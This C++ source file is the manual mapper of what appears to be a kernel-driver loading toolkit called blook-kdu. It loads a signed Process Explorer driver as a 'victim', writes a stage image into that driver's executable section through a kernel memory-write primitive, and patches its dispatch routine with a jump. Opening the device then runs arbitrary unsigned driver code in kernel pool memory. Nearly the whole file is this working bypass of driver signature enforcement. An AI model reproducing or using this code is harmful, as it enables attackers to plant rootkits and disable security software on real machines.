// blook-kdu: manual mapper.
//
// The mapper has three inputs:
//   * the target image (payload or an arbitrary .sys), prepared in user mode:
//     sections lifted to their virtual addresses, imports resolved against the
//     loaded ntoskrnl exports, DIR64 relocation offsets collected;
//   * the kernel stage image (a tiny WDK driver built from src/loader/stage),
//     prepared the same way and located in a spare page of a victim driver's
//     .text section;
//   * a victim driver (signed Process Explorer driver) loaded on demand as a
//     normal service, used only as the execution trampoline.
//
// The stage runs in kernel context in the loader thread: it restores the victim
// dispatch bytes, allocates pool memory, copies/relocates the target image,
// calls its entry point with the bootstrap block and hands the IRP back to the
// original dispatch routine. The pool allocation becomes the mapped driver.
#include "loader/manual_map.h"

#include <cstring>
#include <map>
#include <mutex>
#include <string>
#include <vector>

#include "core/device_io.h"
#include "core/kernel_exports.h"
#include "core/log.h"
#include "core/module_enum.h"
#include "core/page_table.h"
#include "core/win32.h"
#include "loader/stage_params.h"
#include "loader/victim.h"

#if __has_include("stage_blob.h")
#include "stage_blob.h"
#define KDU_HAVE_STAGE_BLOB 1
#else
#define KDU_HAVE_STAGE_BLOB 0
#endif

namespace blook::kdu {
namespace {

constexpr std::uint64_t kPageSize = 0x1000;
constexpr std::uint32_t kPoolTag = 'udks';
constexpr std::size_t kDispatchPatchSize = 5;
constexpr std::size_t kMaxStageSize = 0x8000;

std::uint64_t align_up(std::uint64_t value, std::uint64_t alignment) {
    return (value + alignment - 1) & ~(alignment - 1);
}

// Resolve the loaded ntoskrnl base address on the live system.
Result<std::uint64_t> ntoskrnl_base() {
    auto modules = core::enum_kernel_modules();
    if (!modules) {
        return Result<std::uint64_t>::fail(modules.error().code,
                                           modules.error().message);
    }
    const auto* ntos = core::find_module(modules.value(), "ntoskrnl.exe");
    if (!ntos) {
        return Result<std::uint64_t>::fail(Status::not_found,
                                           "ntoskrnl.exe is not loaded");
    }
    return Result<std::uint64_t>::ok(ntos->base);
}

std::uint64_t kernel_export(const std::map<std::string, std::uint32_t>& exports,
                            std::uint64_t ntoskrnl_base, const char* name) {
    auto found = exports.find(name);
    if (found == exports.end()) {
        return 0;
    }
    return ntoskrnl_base + found->second;
}

struct PeSection {
    std::string name;
    std::uint32_t virtual_address = 0;
    std::uint32_t virtual_size = 0;
    std::uint32_t raw_offset = 0;
    std::uint32_t raw_size = 0;
    std::uint32_t characteristics = 0;
};

Result<std::vector<PeSection>> pe_sections(
    std::span<const std::uint8_t> image) {
    if (image.size() < sizeof(IMAGE_DOS_HEADER)) {
        return Result<std::vector<PeSection>>::fail(Status::invalid_image,
                                                    "image too small");
    }
    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(image.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        static_cast<std::size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS) >
            image.size()) {
        return Result<std::vector<PeSection>>::fail(Status::invalid_image,
                                                    "bad PE header");
    }
    const auto* nt =
        reinterpret_cast<const IMAGE_NT_HEADERS*>(image.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return Result<std::vector<PeSection>>::fail(Status::invalid_image,
                                                    "bad PE signature");
    }
    std::vector<PeSection> sections;
    const auto* section = IMAGE_FIRST_SECTION(nt);
    for (USHORT index = 0; index < nt->FileHeader.NumberOfSections; ++index) {
        PeSection parsed;
        const auto& raw = section[index];
        char name[9] = {};
        std::memcpy(name, raw.Name, 8);
        parsed.name = name;
        parsed.virtual_address = raw.VirtualAddress;
        parsed.virtual_size = raw.Misc.VirtualSize;
        parsed.raw_offset = raw.PointerToRawData;
        parsed.raw_size = raw.SizeOfRawData;
        parsed.characteristics = raw.Characteristics;
        sections.push_back(std::move(parsed));
    }
    return Result<std::vector<PeSection>>::ok(std::move(sections));
}

struct PeIdentity {
    std::uint32_t time_date_stamp = 0;
    std::uint32_t size_of_image = 0;
    std::uint32_t entry_point = 0;
    std::uint64_t image_base = 0;
};

Result<PeIdentity> pe_identity(std::span<const std::uint8_t> image) {
    if (image.size() < sizeof(IMAGE_DOS_HEADER)) {
        return Result<PeIdentity>::fail(Status::invalid_image, "too small");
    }
    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(image.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
        static_cast<std::size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS) >
            image.size()) {
        return Result<PeIdentity>::fail(Status::invalid_image, "bad header");
    }
    const auto* nt =
        reinterpret_cast<const IMAGE_NT_HEADERS*>(image.data() + dos->e_lfanew);
    PeIdentity identity;
    identity.time_date_stamp = nt->FileHeader.TimeDateStamp;
    identity.size_of_image = nt->OptionalHeader.SizeOfImage;
    identity.entry_point = nt->OptionalHeader.AddressOfEntryPoint;
    identity.image_base = nt->OptionalHeader.ImageBase;
    return Result<PeIdentity>::ok(identity);
}

// Find the loaded base of the victim driver by matching its PE identity, which
// does not depend on the file name it was staged under.
Result<std::uint64_t> find_victim_base(IKernelAccess& access,
                                       const PeIdentity& identity) {
    auto modules = core::enum_kernel_modules();
    if (!modules) {
        return Result<std::uint64_t>::fail(modules.error().code,
                                           modules.error().message);
    }
    std::uint8_t header[0x1000];
    for (const auto& module : modules.value()) {
        if (module.base == 0) {
            continue;
        }
        if (module.size != 0 && module.size != identity.size_of_image) {
            continue;
        }
        auto read = access.read_virtual(module.base, header, sizeof(header));
        if (!read) {
            continue;
        }
        const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(header);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew < 0 ||
            static_cast<std::size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS) >
                sizeof(header)) {
            continue;
        }
        const auto* nt =
            reinterpret_cast<const IMAGE_NT_HEADERS*>(header + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            continue;
        }
        if (nt->FileHeader.TimeDateStamp == identity.time_date_stamp) {
            return Result<std::uint64_t>::ok(module.base);
        }
    }
    return Result<std::uint64_t>::fail(
        Status::not_found, "victim driver is not present in the module list");
}

// Scan the victim image's .text for the dispatch routine signature and return
// its RVA.
Result<std::uint32_t> find_dispatch_rva(
    std::span<const std::uint8_t> victim_image,
    std::span<const std::uint8_t> signature) {
    auto sections = pe_sections(victim_image);
    if (!sections) {
        return Result<std::uint32_t>::fail(sections.error().code,
                                           sections.error().message);
    }
    for (const auto& section : sections.value()) {
        if ((section.characteristics & IMAGE_SCN_MEM_EXECUTE) == 0) {
            continue;
        }
        if (section.raw_size < signature.size()) {
            continue;
        }
        const auto* begin = victim_image.data() + section.raw_offset;
        const auto* end = begin + section.raw_size - signature.size();
        for (const auto* cursor = begin; cursor <= end; ++cursor) {
            if (std::memcmp(cursor, signature.data(), signature.size()) == 0) {
                const auto offset = static_cast<std::uint32_t>(cursor - begin);
                return Result<std::uint32_t>::ok(section.virtual_address +
                                                 offset);
            }
        }
    }
    return Result<std::uint32_t>::fail(Status::not_found,
                                       "victim dispatch signature not found");
}

// Prepare a user buffer that the kernel stage can read while running in our
// thread context; locked pages avoid paging surprises.
struct LockedBuffer {
    void* data = nullptr;
    std::size_t size = 0;

    LockedBuffer() = default;
    LockedBuffer(const LockedBuffer&) = delete;
    LockedBuffer& operator=(const LockedBuffer&) = delete;
    LockedBuffer(LockedBuffer&& other) noexcept
        : data(std::exchange(other.data, nullptr)),
          size(std::exchange(other.size, 0)) {}
    LockedBuffer& operator=(LockedBuffer&& other) noexcept {
        if (this != &other) {
            reset();
            data = std::exchange(other.data, nullptr);
            size = std::exchange(other.size, 0);
        }
        return *this;
    }
    ~LockedBuffer() { reset(); }

    Result<void> allocate(std::size_t bytes) {
        reset();
        data = ::VirtualAlloc(nullptr, bytes, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
        if (!data) {
            return Result<void>::fail(Status::no_memory,
                                      "VirtualAlloc failed for map staging");
        }
        size = bytes;
        (void)::VirtualLock(data, bytes);  // best effort
        return Result<void>::ok();
    }

    void reset() {
        if (data) {
            (void)::VirtualUnlock(data, size);
            ::VirtualFree(data, 0, MEM_RELEASE);
            data = nullptr;
            size = 0;
        }
    }
};

// Apply the collected DIR64 relocations to a prepared image so it can run at
// `actual_base`.
void apply_relocations(PreparedImage& image, std::uint64_t actual_base) {
    const std::uint64_t delta = actual_base - image.preferred_base;
    for (const auto relocation : image.relocations) {
        if (relocation + sizeof(std::uint64_t) > image.mapped.size()) {
            continue;
        }
        auto* slot =
            reinterpret_cast<std::uint64_t*>(image.mapped.data() + relocation);
        *slot += delta;
    }
}

// Parse the metadata block of the kernel stage image: params section offset and
// entry point.
struct StageBlobInfo {
    std::size_t params_offset = 0;
    std::uint32_t entry_offset = 0;
};

Result<StageBlobInfo> stage_blob_info(const PreparedImage& stage) {
    StageBlobInfo info;
    info.entry_offset = stage.entry_offset;
    auto sections = pe_sections(std::span<const std::uint8_t>(
        stage.mapped.data(), stage.mapped.size()));
    if (!sections) {
        return Result<StageBlobInfo>::fail(sections.error().code,
                                           sections.error().message);
    }
    for (const auto& section : sections.value()) {
        if (section.name == ".kparam") {
            info.params_offset = section.virtual_address;
            break;
        }
    }
    if (info.params_offset == 0) {
        return Result<StageBlobInfo>::fail(
            Status::invalid_image, "stage image has no .kparam section");
    }
    return Result<StageBlobInfo>::ok(info);
}

std::string wide_to_utf8(const std::wstring& text) {
    return core::to_utf8(text);
}

}  // namespace

// ---------------------------------------------------------------------------
// Image preparation
// ---------------------------------------------------------------------------
Result<PreparedImage> prepare_image(std::span<const std::uint8_t> image) {
    if (image.size() < sizeof(IMAGE_DOS_HEADER)) {
        return Result<PreparedImage>::fail(Status::invalid_image,
                                           "image is too small");
    }
    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(image.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return Result<PreparedImage>::fail(Status::invalid_image,
                                           "missing DOS signature");
    }
    if (dos->e_lfanew < 0 ||
        static_cast<std::size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS) >
            image.size()) {
        return Result<PreparedImage>::fail(Status::invalid_image,
                                           "bad e_lfanew");
    }
    const auto* nt =
        reinterpret_cast<const IMAGE_NT_HEADERS*>(image.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return Result<PreparedImage>::fail(Status::invalid_image,
                                           "missing PE signature");
    }
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        return Result<PreparedImage>::fail(Status::invalid_image,
                                           "image is not x64");
    }
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return Result<PreparedImage>::fail(Status::invalid_image,
                                           "image is not PE32+");
    }
    // Kernel drivers are linked without IMAGE_FILE_DLL on some WDK versions, so
    // only require a valid executable image.
    if ((nt->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == 0) {
        return Result<PreparedImage>::fail(
            Status::invalid_image, "image is not an executable image (.sys)");
    }
    if (nt->OptionalHeader.SizeOfImage == 0 ||
        nt->OptionalHeader.SizeOfImage > 0x4000000) {
        return Result<PreparedImage>::fail(Status::invalid_image,
                                           "unreasonable SizeOfImage");
    }

    const auto size_of_image = nt->OptionalHeader.SizeOfImage;
    const auto headers_size = nt->OptionalHeader.SizeOfHeaders;

    PreparedImage prepared;
    prepared.size_of_image = size_of_image;
    prepared.entry_offset = nt->OptionalHeader.AddressOfEntryPoint;
    prepared.preferred_base = nt->OptionalHeader.ImageBase;
    const auto& export_directory =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (export_directory.VirtualAddress != 0 &&
        export_directory.VirtualAddress + export_directory.Size <=
            image.size()) {
        const auto* exports = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(
            image.data() + export_directory.VirtualAddress);
        if (exports->Name != 0 && exports->Name < image.size()) {
            prepared.dll_name =
                reinterpret_cast<const char*>(image.data() + exports->Name);
        }
    }
    prepared.mapped.assign(size_of_image, 0);
    if (headers_size > size_of_image || headers_size > image.size()) {
        return Result<PreparedImage>::fail(Status::invalid_image,
                                           "bad SizeOfHeaders");
    }
    std::memcpy(prepared.mapped.data(), image.data(), headers_size);

    const auto* sections = IMAGE_FIRST_SECTION(nt);
    for (USHORT index = 0; index < nt->FileHeader.NumberOfSections; ++index) {
        const auto& section = sections[index];
        if (section.SizeOfRawData == 0) {
            continue;
        }
        if (static_cast<std::size_t>(section.PointerToRawData) +
                section.SizeOfRawData >
            image.size()) {
            return Result<PreparedImage>::fail(Status::invalid_image,
                                               "section data out of bounds");
        }
        if (section.VirtualAddress + section.SizeOfRawData > size_of_image) {
            return Result<PreparedImage>::fail(Status::invalid_image,
                                               "section exceeds SizeOfImage");
        }
        std::memcpy(prepared.mapped.data() + section.VirtualAddress,
                    image.data() + section.PointerToRawData,
                    section.SizeOfRawData);
    }

    const auto& reloc_directory =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (reloc_directory.VirtualAddress != 0 && reloc_directory.Size != 0) {
        if (reloc_directory.VirtualAddress + reloc_directory.Size >
            size_of_image) {
            return Result<PreparedImage>::fail(Status::invalid_image,
                                               "relocations out of bounds");
        }
        std::size_t cursor = reloc_directory.VirtualAddress;
        const std::size_t end = cursor + reloc_directory.Size;
        while (cursor + sizeof(IMAGE_BASE_RELOCATION) <= end) {
            const auto* block = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                prepared.mapped.data() + cursor);
            if (block->SizeOfBlock == 0 || cursor + block->SizeOfBlock > end) {
                break;
            }
            const auto count =
                (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
                sizeof(WORD);
            const auto* entries =
                reinterpret_cast<const WORD*>(prepared.mapped.data() + cursor +
                                              sizeof(IMAGE_BASE_RELOCATION));
            for (std::size_t index = 0; index < count; ++index) {
                const WORD entry = entries[index];
                const WORD type = entry >> 12;
                const WORD offset = entry & 0x0FFF;
                if (type == IMAGE_REL_BASED_ABSOLUTE) {
                    continue;
                }
                if (type != IMAGE_REL_BASED_DIR64) {
                    return Result<PreparedImage>::fail(
                        Status::invalid_image,
                        "unsupported relocation type " + std::to_string(type));
                }
                const auto rva = block->VirtualAddress + offset;
                if (rva + sizeof(std::uint64_t) > size_of_image) {
                    return Result<PreparedImage>::fail(
                        Status::invalid_image, "relocation out of bounds");
                }
                prepared.relocations.push_back(rva);
            }
            cursor += block->SizeOfBlock;
        }
    }

    // Resolve imports against ntoskrnl.
    auto ntos = ntoskrnl_base();
    if (!ntos) {
        return Result<PreparedImage>::fail(ntos.error().code,
                                           ntos.error().message);
    }
    auto exports = core::load_kernel_exports(core::system_root() +
                                             "\\System32\\ntoskrnl.exe");
    if (!exports) {
        return Result<PreparedImage>::fail(exports.error().code,
                                           exports.error().message);
    }
    auto& export_map = exports.value();

    std::size_t patched_imports = 0;
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
            .VirtualAddress != 0) {
        std::size_t cursor =
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
                .VirtualAddress;
        while (true) {
            const auto* descriptor =
                reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(
                    prepared.mapped.data() + cursor);
            if (descriptor->Name == 0) {
                break;
            }
            const std::string module_name = reinterpret_cast<const char*>(
                prepared.mapped.data() + descriptor->Name);
            prepared.imported_modules.push_back(module_name);
            if (_stricmp(module_name.c_str(), "ntoskrnl.exe") != 0 &&
                _stricmp(module_name.c_str(), "hal.dll") != 0 &&
                _stricmp(module_name.c_str(), "ntkrnlmp.exe") != 0) {
                return Result<PreparedImage>::fail(
                    Status::invalid_image,
                    "unsupported import module: " + module_name);
            }
            const auto lookup_rva = descriptor->OriginalFirstThunk
                                        ? descriptor->OriginalFirstThunk
                                        : descriptor->FirstThunk;
            auto* iat = reinterpret_cast<std::uint64_t*>(
                prepared.mapped.data() + descriptor->FirstThunk);
            const auto* lookup = reinterpret_cast<const std::uint64_t*>(
                prepared.mapped.data() + lookup_rva);
            for (std::size_t index = 0; lookup[index] != 0; ++index) {
                if ((lookup[index] & IMAGE_ORDINAL_FLAG64) != 0) {
                    return Result<PreparedImage>::fail(
                        Status::invalid_image,
                        "ordinal imports are not supported");
                }
                const auto* name = reinterpret_cast<const char*>(
                    prepared.mapped.data() + (lookup[index] & 0x7FFFFFFF) + 2);
                auto found = export_map.find(name);
                if (found == export_map.end()) {
                    return Result<PreparedImage>::fail(
                        Status::invalid_image,
                        std::string("unresolved import: ") + name + " from " +
                            module_name);
                }
                iat[index] = ntos.value() + found->second;
                ++patched_imports;
            }
            cursor += sizeof(IMAGE_IMPORT_DESCRIPTOR);
        }
    }

    KDU_LOG_WARN("prepare_image patched {} imports (ntos base 0x{:x})",
                 patched_imports, ntos.value());
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]
            .Size != 0) {
        KDU_LOG_DEBUG(
            "image has an exception directory; SEH inside a manually mapped "
            "image is only supported if the payload registers its tables");
    }
    KDU_LOG_INFO("prepared image {} ({} bytes, {} relocations, entry 0x{:x})",
                 prepared.dll_name.empty() ? "<unnamed>" : prepared.dll_name,
                 prepared.size_of_image, prepared.relocations.size(),
                 prepared.entry_offset);
    return Result<PreparedImage>::ok(std::move(prepared));
}

// ---------------------------------------------------------------------------
// ManualMapper
// ---------------------------------------------------------------------------
ManualMapper::ManualMapper(IKernelAccess& access,
                           exploits::IServiceHost& services)
    : access_(access), services_(services) {}

ManualMapper::~ManualMapper() = default;

Result<MappedImage> ManualMapper::map(std::span<const std::uint8_t> image,
                                      const MapOptions& options) {
#if !KDU_HAVE_STAGE_BLOB
    (void)image;
    (void)options;
    return Result<MappedImage>::fail(
        Status::mapping_failed,
        "the kernel stage image is not embedded in this build (build the "
        "kdu_stage target / run scripts/build.ps1)");
#else
    auto prepared = prepare_image(image);
    if (!prepared) {
        return Result<MappedImage>::fail(prepared.error().code,
                                         prepared.error().message);
    }

    // 1. Stage image preparation (same PE machinery as the target image).
    auto stage = prepare_image(
        std::span<const std::uint8_t>(kdu_stage_image, kdu_stage_image_size));
    if (!stage) {
        return Result<MappedImage>::fail(
            Status::mapping_failed,
            "cannot prepare the kernel stage image: " + stage.error().message);
    }
    if (stage->size_of_image > kMaxStageSize) {
        return Result<MappedImage>::fail(Status::mapping_failed,
                                         "kernel stage image is too large");
    }
    auto blob_info = stage_blob_info(stage.value());
    if (!blob_info) {
        return Result<MappedImage>::fail(Status::mapping_failed,
                                         blob_info.error().message);
    }

    // 2. Victim driver image + identity + dispatch signature.
    auto victim = loader::victim_image();
    if (!victim) {
        return Result<MappedImage>::fail(victim.error().code,
                                         victim.error().message);
    }
    auto identity = pe_identity(victim.value());
    if (!identity) {
        return Result<MappedImage>::fail(Status::invalid_image,
                                         identity.error().message);
    }
    auto dispatch_rva =
        find_dispatch_rva(victim.value(), loader::victim_dispatch_signature());
    if (!dispatch_rva) {
        return Result<MappedImage>::fail(
            Status::not_found, "cannot locate the victim dispatch routine: " +
                                   dispatch_rva.error().message);
    }

    // 3. Load the victim driver (this is the only service we create for the
    //    mapping; it is unloaded again before map() returns).
    auto victim_device = services_.start(loader::victim_info());
    if (!victim_device) {
        return Result<MappedImage>::fail(
            Status::mapping_failed,
            "cannot load the victim driver: " + victim_device.error().message);
    }
    auto unload_victim = [this]() {
        (void)services_.stop(loader::victim_info());
    };

    auto victim_base = find_victim_base(access_, identity.value());
    if (!victim_base) {
        unload_victim();
        return Result<MappedImage>::fail(Status::mapping_failed,
                                         victim_base.error().message);
    }
    const std::uint64_t dispatch_va =
        victim_base.value() + dispatch_rva.value();

    // 4. Find the .text section bounds of the victim in kernel VA space.
    auto victim_sections = pe_sections(victim.value());
    if (!victim_sections) {
        unload_victim();
        return Result<MappedImage>::fail(Status::invalid_image,
                                         victim_sections.error().message);
    }
    std::uint64_t text_va = 0;
    std::uint64_t text_size = 0;
    for (const auto& section : victim_sections.value()) {
        if ((section.characteristics & IMAGE_SCN_MEM_EXECUTE) != 0) {
            text_va = victim_base.value() + section.virtual_address;
            text_size = section.virtual_size;
            break;
        }
    }
    if (text_va == 0 || text_size == 0) {
        unload_victim();
        return Result<MappedImage>::fail(Status::invalid_image,
                                         "victim has no executable section");
    }

    // 5. Pick a stage page inside .text, on a different page than the dispatch
    //    entry (the stage restores the dispatch page before doing any work).
    const std::uint64_t stage_size = stage->size_of_image;
    const std::uint64_t stage_pages = align_up(stage_size, kPageSize);
    const std::uint64_t dispatch_page = dispatch_va & ~(kPageSize - 1);
    std::uint64_t stage_va = 0;
    for (std::uint64_t candidate =
             (text_va + text_size - stage_pages) & ~(kPageSize - 1);
         candidate >= text_va; candidate -= kPageSize) {
        const std::uint64_t candidate_end = candidate + stage_pages;
        const bool overlaps_dispatch =
            candidate <= dispatch_page && dispatch_page < candidate_end;
        const bool inside_text = candidate_end <= text_va + text_size;
        if (!overlaps_dispatch && inside_text) {
            stage_va = candidate;
            break;
        }
        if (candidate < text_va + kPageSize) {
            break;
        }
    }
    if (stage_va == 0) {
        unload_victim();
        return Result<MappedImage>::fail(
            Status::mapping_failed,
            "no spare executable page found in the victim driver");
    }

    // 6. Create the user-side buffers the stage reads: prepared image,
    //    relocation offsets, bootstrap copy, backup of the stage page and a
    //    result block.
    LockedBuffer image_buffer;
    LockedBuffer reloc_buffer;
    LockedBuffer bootstrap_buffer;
    LockedBuffer backup_buffer;
    LockedBuffer result_buffer;
    if (!image_buffer.allocate(prepared->mapped.size()) ||
        !reloc_buffer.allocate(
            prepared->relocations.size() * sizeof(std::uint32_t) + 8) ||
        !bootstrap_buffer.allocate(
            options.bootstrap.empty() ? 8 : options.bootstrap.size()) ||
        !backup_buffer.allocate(static_cast<std::size_t>(stage_pages)) ||
        !result_buffer.allocate(sizeof(kdu_stage_result))) {
        unload_victim();
        return Result<MappedImage>::fail(Status::no_memory,
                                         "cannot allocate map staging buffers");
    }
    std::memcpy(image_buffer.data, prepared->mapped.data(),
                prepared->mapped.size());
    auto* relocations = static_cast<std::uint32_t*>(reloc_buffer.data);
    for (std::size_t index = 0; index < prepared->relocations.size(); ++index) {
        relocations[index] = prepared->relocations[index];
    }
    if (!options.bootstrap.empty()) {
        std::memcpy(bootstrap_buffer.data, options.bootstrap.data(),
                    options.bootstrap.size());
    }
    std::memset(result_buffer.data, 0, result_buffer.size);

    // 7. Fill the stage parameters, relocate the stage image for `stage_va` and
    //    place it in the victim's .text.
    auto ntos = ntoskrnl_base();
    if (!ntos) {
        unload_victim();
        return Result<MappedImage>::fail(ntos.error().code,
                                         ntos.error().message);
    }
    auto exports = core::load_kernel_exports(core::system_root() +
                                             "\\System32\\ntoskrnl.exe");
    if (!exports) {
        unload_victim();
        return Result<MappedImage>::fail(exports.error().code,
                                         exports.error().message);
    }
    const auto allocate_pool =
        kernel_export(exports.value(), ntos.value(), "ExAllocatePoolWithTag");
    if (allocate_pool == 0) {
        unload_victim();
        return Result<MappedImage>::fail(
            Status::not_found, "ExAllocatePoolWithTag is not exported");
    }

    auto* params = reinterpret_cast<kdu_stage_params*>(
        stage->mapped.data() + blob_info->params_offset);
    std::memset(params, 0, sizeof(*params));
    params->magic = KDU_STAGE_PARAMS_MAGIC;
    params->version = KDU_STAGE_PARAMS_VERSION;
    params->pool_tag = kPoolTag;
    params->original_dispatch = dispatch_va;
    params->dispatch_va = dispatch_va;
    std::memcpy(params->dispatch_backup, victim->data() + dispatch_rva.value(),
                kDispatchPatchSize);
    params->stage_va = stage_va;
    params->stage_size = stage_size;
    params->image_source_user =
        reinterpret_cast<std::uint64_t>(image_buffer.data);
    params->image_size = prepared->size_of_image;
    params->image_alloc_size =
        align_up(prepared->size_of_image + 0x1000, kPageSize);
    params->reloc_offsets_user =
        reinterpret_cast<std::uint64_t>(reloc_buffer.data);
    params->reloc_count = prepared->relocations.size();
    params->preferred_base = prepared->preferred_base;
    params->entry_offset = prepared->entry_offset;
    params->bootstrap_source_user =
        reinterpret_cast<std::uint64_t>(bootstrap_buffer.data);
    params->bootstrap_size = options.bootstrap.size();
    params->allocate_pool = allocate_pool;
    params->result_user = reinterpret_cast<std::uint64_t>(result_buffer.data);

    apply_relocations(stage.value(), stage_va);

    auto stage_written =
        access_.write_virtual(stage_va, stage->mapped.data(), stage_size);
    if (!stage_written) {
        unload_victim();
        return Result<MappedImage>::fail(
            Status::mapping_failed,
            "cannot write the stage image: " + stage_written.error().message);
    }
    auto stage_backup = access_.read_virtual(
        stage_va, backup_buffer.data, static_cast<std::size_t>(stage_pages));
    // (read failure is tolerated; restoring garbage is worse than not
    // restoring)

    // 8. Redirect the dispatch routine to the stage entry and trigger it by
    //    opening the victim device.
    const std::uint64_t entry_va = stage_va + blob_info->entry_offset;
    std::uint8_t patch[kDispatchPatchSize] = {0xE9, 0, 0, 0, 0};
    const auto relative = static_cast<std::int32_t>(
        entry_va - (dispatch_va + kDispatchPatchSize));
    std::memcpy(patch + 1, &relative, sizeof(relative));
    auto patched = access_.write_virtual(dispatch_va, patch, sizeof(patch));
    if (!patched) {
        (void)access_.write_virtual(stage_va, backup_buffer.data,
                                    static_cast<std::size_t>(stage_pages));
        unload_victim();
        return Result<MappedImage>::fail(
            Status::mapping_failed,
            "cannot patch the victim dispatch routine: " +
                patched.error().message);
    }

    auto trigger =
        core::open_device(loader::victim_info().device_name.empty()
                              ? "\\\\.\\PROCEXP152"
                              : std::string(loader::victim_info().device_name),
                          GENERIC_READ | GENERIC_WRITE, 3, 50);
    // Opening the device is the trigger; a failure after the stage ran is fine
    // (the original create handler decides the result).
    if (!trigger) {
        KDU_LOG_DEBUG("victim open failed (stage may still have run): {}",
                      trigger.error().message);
    }

    // 9. Restore the patched pages defensively (the stage already restored the
    //    dispatch entry; the stage page is restored here).
    (void)access_.write_virtual(dispatch_va, params->dispatch_backup,
                                kDispatchPatchSize);
    if (stage_backup) {
        (void)access_.write_virtual(stage_va, backup_buffer.data,
                                    static_cast<std::size_t>(stage_pages));
    }
    unload_victim();

    const auto* result =
        static_cast<const kdu_stage_result*>(result_buffer.data);
    if (result->magic != KDU_STAGE_RESULT_MAGIC || result->image_base == 0) {
        return Result<MappedImage>::fail(
            Status::mapping_failed,
            "the kernel stage did not report a mapped image (the victim "
            "dispatch was not reached?)");
    }
    MappedImage mapping;
    mapping.name = options.name;
    mapping.base = result->image_base;
    mapping.size = prepared->size_of_image;
    mapping.entry_status = static_cast<std::int32_t>(result->status);
    KDU_LOG_INFO("mapped {} at 0x{:x} ({} bytes), entry status 0x{:x}",
                 mapping.name.empty() ? "<unnamed>" : mapping.name,
                 mapping.base, mapping.size,
                 static_cast<unsigned>(mapping.entry_status));
    mapped_.push_back(mapping);
    return Result<MappedImage>::ok(mapping);
#endif  // KDU_HAVE_STAGE_BLOB
}

Result<void> ManualMapper::unmap(std::uint64_t base) {
    // The mapped image lives in a non-paged pool allocation that is currently
    // executing kernel code; freeing it in place would bugcheck. We only track
    // that it is no longer addressable through the SDK.
    for (auto iterator = mapped_.begin(); iterator != mapped_.end();
         ++iterator) {
        if (iterator->base == base) {
            mapped_.erase(iterator);
            KDU_LOG_WARN(
                "unmap(0x{:x}): the pool allocation cannot be freed while "
                "mapped; it is released on reboot (documented residual)",
                base);
            return Result<void>::ok();
        }
    }
    return Result<void>::fail(Status::not_found, "image is not mapped");
}

}  // namespace blook::kdu
